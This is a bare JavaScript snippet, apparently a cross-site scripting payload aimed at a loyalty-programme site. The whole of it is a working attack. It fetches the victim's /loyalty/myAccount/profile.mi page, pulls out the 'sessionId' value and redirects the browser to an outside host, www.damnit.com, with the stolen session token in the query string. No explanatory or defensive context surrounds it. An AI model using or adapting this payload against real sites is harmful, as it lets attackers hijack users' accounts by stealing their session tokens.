
var res = location.protocol + '//' + document.domain + '/loyalty/myAccount/profile.mi';
var req = new XMLHttpRequest();

req.onreadystatechange = function() {
     if(req.readyState==4 && req.status==200) {
	     var response = req.responseText;
	     var n = response.search("\"sessionId\"");
	     if(n > 0){
	       var risk = response.substring(n+15, n+38);
	       var win = 'http://www.damnit.com/?c='+risk;
	       window.location = win;
	     } else {
	       //alert("not found");
	     }
     }
}

req.open("GET",res,true);
req.send();

